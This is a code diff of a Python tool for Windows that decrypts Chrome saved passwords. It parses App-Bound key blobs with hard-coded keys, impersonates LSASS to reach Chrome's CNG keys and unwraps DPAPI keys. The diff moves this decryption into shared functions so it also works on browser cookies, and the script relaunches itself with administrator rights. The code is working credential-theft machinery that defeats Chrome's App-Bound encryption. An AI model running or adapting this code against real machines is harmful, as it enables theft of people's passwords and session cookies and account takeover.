@@ -54,18 +54,14 @@ def parse_key_blob(blob_data: bytes) -> dict:
     parsed_data['header'] = buffer.read(header_len)
     content_len = struct.unpack('<I', buffer.read(4))[0]
     assert header_len + content_len + 8 == len(blob_data)
-    
+
     parsed_data['flag'] = buffer.read(1)[0]
-    
+
     if parsed_data['flag'] == 1 or parsed_data['flag'] == 2:
-        # [flag|iv|ciphertext|tag] decrypted_blob
-        # [1byte|12bytes|32bytes|16bytes]
         parsed_data['iv'] = buffer.read(12)
         parsed_data['ciphertext'] = buffer.read(32)
         parsed_data['tag'] = buffer.read(16)
     elif parsed_data['flag'] in (3, 4):
-        # [flag|encrypted_aes_key|iv|ciphertext|tag] decrypted_blob
-        # [1byte|32bytes|12bytes|32bytes|16bytes]
         parsed_data['encrypted_aes_key'] = buffer.read(32)
         parsed_data['iv'] = buffer.read(12)
         parsed_data['ciphertext'] = buffer.read(32)
@@ -91,14 +87,8 @@ def decrypt_with_cng(input_data, key_name):
     input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
 
     status = ncrypt.NCryptDecrypt(
-        hKey,
-        input_buffer,
-        len(input_buffer),
-        None,
-        None,
-        0,
-        ctypes.byref(pcbResult),
-        0x40   # NCRYPT_SILENT_FLAG
+        hKey, input_buffer, len(input_buffer), None, None, 0,
+        ctypes.byref(pcbResult), 0x40
     )
     assert status == 0, f"1st NCryptDecrypt failed with status {status}"
 
@@ -106,14 +96,8 @@ def decrypt_with_cng(input_data, key_name):
     output_buffer = (ctypes.c_ubyte * pcbResult.value)()
 
     status = ncrypt.NCryptDecrypt(
-        hKey,
-        input_buffer,
-        len(input_buffer),
-        None,
-        output_buffer,
-        buffer_size,
-        ctypes.byref(pcbResult),
-        0x40   # NCRYPT_SILENT_FLAG
+        hKey, input_buffer, len(input_buffer), None, output_buffer,
+        buffer_size, ctypes.byref(pcbResult), 0x40
     )
     assert status == 0, f"2nd NCryptDecrypt failed with status {status}"
 
@@ -131,81 +115,59 @@ def derive_v20_master_key(parsed_data: dict) -> bytes:
     if parsed_data['flag'] == 1:
         aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
         cipher = AESGCM(aes_key)
-
     elif parsed_data['flag'] == 2:
         chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
         cipher = ChaCha20Poly1305(chacha20_key)
-
     elif parsed_data['flag'] == 3:
         xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
         with impersonate_lsass():
             decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name="Google Chromekey1")
         xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
         cipher = AESGCM(xored_aes_key)
-    
     elif parsed_data['flag'] == 4:
         xor_key = bytes.fromhex("208A6DA7114A44E6B463114BD9DA397E939ADEFEDBF4588117926B0F2C503158")
         with impersonate_lsass():
             decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name="Google Chromekey2")
         xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
         cipher = AESGCM(xored_aes_key)
+    else:
+        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")
 
     return cipher.decrypt(parsed_data['iv'], parsed_data['ciphertext'] + parsed_data['tag'], None)
 
 
-def extract_chrome_passwords(profile_dir_path: str,
-                             local_state_path: Optional[str] = None,
-                             log_callback: Optional[Callable[[str], None]] = None) -> List[Dict[str, str]]:
+# ---------------------------------------------------------------------------
+# Reusable key-derivation + blob decryption (used by passwords AND cookies)
+# ---------------------------------------------------------------------------
+
+def derive_chromium_ciphers(local_state_path: str,
+                            log_callback: Optional[Callable[[str], None]] = None):
     """
-    Extracts and decrypts saved passwords from a Chrome profile directory.
-
-    Returns a list of dicts: [{"hostname": ..., "username": ..., "password": ...}, ...]
-    Returns an empty list if Login Data or Local State is missing or if decryption fails.
+    Returns (v20_cipher, v10_cipher) derived from a Local State file.
+    Either may be None if the key is unavailable / not admin.
     """
-    profile_dir = Path(profile_dir_path)
-    login_db_path = profile_dir / "Login Data"
-
-    if not login_db_path.is_file():
-        if log_callback:
-            log_callback(f"Login Data not found in {profile_dir} — no saved passwords.")
-        return []
-
-    # Locate Local State if not explicitly provided
-    if not local_state_path or not os.path.isfile(local_state_path):
-        candidate = profile_dir.parent / "Local State"
-        if candidate.is_file():
-            local_state_path = str(candidate)
-        else:
-            candidate = profile_dir / "Local State"
-            if candidate.is_file():
-                local_state_path = str(candidate)
+    v20_cipher = None
+    v10_cipher = None
 
     if not local_state_path or not os.path.isfile(local_state_path):
-        if log_callback:
-            log_callback(f"Local State not found for {profile_dir} — cannot decrypt Chrome passwords.")
-        return []
+        return v20_cipher, v10_cipher
 
-    # Read Local State
     try:
         with open(local_state_path, "r", encoding="utf-8") as f:
             local_state = json.load(f)
     except Exception as e:
         if log_callback:
             log_callback(f"Failed to read Local State: {e}")
-        return []
+        return v20_cipher, v10_cipher
 
     os_crypt = local_state.get("os_crypt", {})
     app_bound_encrypted_key = os_crypt.get("app_bound_encrypted_key")
     encrypted_key = os_crypt.get("encrypted_key")
 
-    v20_cipher = None
-    v10_cipher = None
-
-    # 1. Derive v20 master key (App-Bound encryption, Chrome 127+)
     if app_bound_encrypted_key:
         if not is_admin():
             if log_callback:
-                log_callback("Admin privileges required for Chrome App-Bound (v20) password decryption.")
+                log_callback("Admin privileges required for App-Bound (v20) decryption.")
         else:
             try:
                 raw_appb = binascii.a2b_base64(app_bound_encrypted_key)
@@ -219,9 +181,8 @@ def extract_chrome_passwords(profile_dir_path: str,
                     v20_cipher = AESGCM(v20_master_key)
             except Exception as e:
                 if log_callback:
-                    log_callback(f"Failed to derive Chrome v20 master key: {e}")
+                    log_callback(f"Failed to derive v20 master key: {e}")
 
-    # 2. Derive v10 master key (DPAPI-protected AES-GCM, Chrome 80-126)
     if encrypted_key:
         try:
             raw_key = binascii.a2b_base64(encrypted_key)
@@ -230,7 +191,83 @@ def extract_chrome_passwords(profile_dir_path: str,
                 v10_cipher = AESGCM(v10_master_key)
         except Exception as e:
             if log_callback:
-                log_callback(f"Failed to derive Chrome v10 master key: {e}")
+                log_callback(f"Failed to derive v10 master key: {e}")
+
+    return v20_cipher, v10_cipher
+
+
+def decrypt_chromium_blob(encrypted_value: Any,
+                          v20_cipher,
+                          v10_cipher,
+                          skip_header: int = 0,
+                          log_callback: Optional[Callable[[str], None]] = None) -> str:
+    """
+    Decrypt a v20 / v10 / legacy DPAPI blob.
+    `skip_header` = bytes to drop after decryption (32 for cookies, 0 for passwords).
+    """
+    if not encrypted_value:
+        return ""
+    if isinstance(encrypted_value, (memoryview, bytearray)):
+        encrypted_value = bytes(encrypted_value)
+    elif isinstance(encrypted_value, str):
+        return encrypted_value
+
+    try:
+        if encrypted_value.startswith(b"v20"):
+            if not v20_cipher:
+                return "(v20 key unavailable)"
+            nonce = encrypted_value[3:15]
+            ct = encrypted_value[15:-16]
+            tag = encrypted_value[-16:]
+            pt = v20_cipher.decrypt(nonce, ct + tag, None)
+            return pt[skip_header:].decode("utf-8", errors="replace") if len(pt) > skip_header else pt.decode("utf-8", errors="replace")
+        elif encrypted_value.startswith(b"v10"):
+            if not v10_cipher:
+                return "(v10 key unavailable)"
+            nonce = encrypted_value[3:15]
+            ct = encrypted_value[15:-16]
+            tag = encrypted_value[-16:]
+            pt = v10_cipher.decrypt(nonce, ct + tag, None)
+            return pt[skip_header:].decode("utf-8", errors="replace") if len(pt) > skip_header else pt.decode("utf-8", errors="replace")
+        else:
+            pt = windows.crypto.dpapi.unprotect(encrypted_value)
+            return pt.decode("utf-8", errors="replace")
+    except Exception as e:
+        if log_callback:
+            log_callback(f"Value decryption failed: {e}")
+        return "(decryption failed)"
+
+
+# ---------------------------------------------------------------------------
+# Password extraction
+# ---------------------------------------------------------------------------
+
+def extract_chrome_passwords(profile_dir_path: str,
+                             local_state_path: Optional[str] = None,
+                             log_callback: Optional[Callable[[str], None]] = None) -> List[Dict[str, str]]:
+    profile_dir = Path(profile_dir_path)
+    login_db_path = profile_dir / "Login Data"
+
+    if not login_db_path.is_file():
+        if log_callback:
+            log_callback(f"Login Data not found in {profile_dir} — no saved passwords.")
+        return []
+
+    if not local_state_path or not os.path.isfile(local_state_path):
+        candidate = profile_dir.parent / "Local State"
+        if candidate.is_file():
+            local_state_path = str(candidate)
+        else:
+            candidate = profile_dir / "Local State"
+            if candidate.is_file():
+                local_state_path = str(candidate)
+
+    if not local_state_path or not os.path.isfile(local_state_path):
+        if log_callback:
+            log_callback(f"Local State not found for {profile_dir} — cannot decrypt passwords.")
+        return []
+
+    v20_cipher, v10_cipher = derive_chromium_ciphers(local_state_path, log_callback)
 
     results: List[Dict[str, str]] = []
 
@@ -238,7 +275,6 @@ def extract_chrome_passwords(profile_dir_path: str,
         temp_db_path = os.path.join(temp_dir, "TempLoginData")
         try:
             shutil.copy2(str(login_db_path), temp_db_path)
-            # Copy WAL file if present so recent transactions are readable
             wal_source = login_db_path.with_name(login_db_path.name + "-wal")
             if wal_source.is_file():
                 try:
@@ -248,7 +284,7 @@ def extract_chrome_passwords(profile_dir_path: str,
         except PermissionError as e:
             if getattr(e, "winerror", None) == 32:
                 if log_callback:
-                    log_callback("Chrome is currently running and locking Login Data. Close Chrome and try again.")
+                    log_callback("Browser is running and locking Login Data. Close it and try again.")
             else:
                 if log_callback:
                     log_callback(f"Permission error accessing Login Data: {e}")
@@ -275,55 +311,16 @@ def extract_chrome_passwords(profile_dir_path: str,
                 continue
             url = url or ""
             username = username or ""
-            password = ""
-
-            try:
-                if encrypted_pwd.startswith(b"v20"):
-                    if v20_cipher:
-                        nonce = encrypted_pwd[3:15]
-                        ciphertext = encrypted_pwd[15:-16]
-                        tag = encrypted_pwd[-16:]
-                        decrypted = v20_cipher.decrypt(nonce, ciphertext + tag, None)
-                        password = decrypted.decode('utf-8', errors='replace')
-                    else:
-                        password = "(decryption failed - v20 key unavailable)"
-                elif encrypted_pwd.startswith(b"v10"):
-                    if v10_cipher:
-                        nonce = encrypted_pwd[3:15]
-                        ciphertext = encrypted_pwd[15:-16]
-                        tag = encrypted_pwd[-16:]
-                        decrypted = v10_cipher.decrypt(nonce, ciphertext + tag, None)
-                        password = decrypted.decode('utf-8', errors='replace')
-                    else:
-                        password = "(decryption failed - v10 key unavailable)"
-                else:
-                    # Legacy DPAPI (pre-Chrome 80)
-                    try:
-                        decrypted = windows.crypto.dpapi.unprotect(encrypted_pwd)
-                        password = decrypted.decode('utf-8', errors='replace')
-                    except Exception:
-                        password = "(decryption failed)"
-
-                results.append({
-                    "hostname": url,
-                    "username": username,
-                    "password": password,
-                })
-            except Exception as e:
-                if log_callback:
-                    log_callback(f"Failed to decrypt entry for {url}: {e}")
-                results.append({
-                    "hostname": url,
-                    "username": username,
-                    "password": "(decryption failed)",
-                })
+            password = decrypt_chromium_blob(encrypted_pwd, v20_cipher, v10_cipher,
+                                             skip_header=0, log_callback=log_callback)
+            results.append({"hostname": url, "username": username, "password": password})
 
     return results
 
 
 def main():
-    parser = ArgumentParser(description="Extract and decrypt Chrome saved passwords")
-    parser.add_argument("-d", "--dir", dest="directory", help="Path to Chrome profile directory")
+    parser = ArgumentParser(description="Extract and decrypt saved passwords")
+    parser.add_argument("-d", "--dir", dest="directory", help="Path to profile directory")
     args = parser.parse_args()
 
     if args.directory:
@@ -343,7 +340,6 @@ def main():
 
 if __name__ == "__main__":
     if not is_admin():
-        # Relaunch the current script using administrator privileges
         import subprocess
         ctypes.windll.shell32.ShellExecuteW(
             None, "runas", sys.executable, subprocess.list2cmdline(sys.argv), None, 1
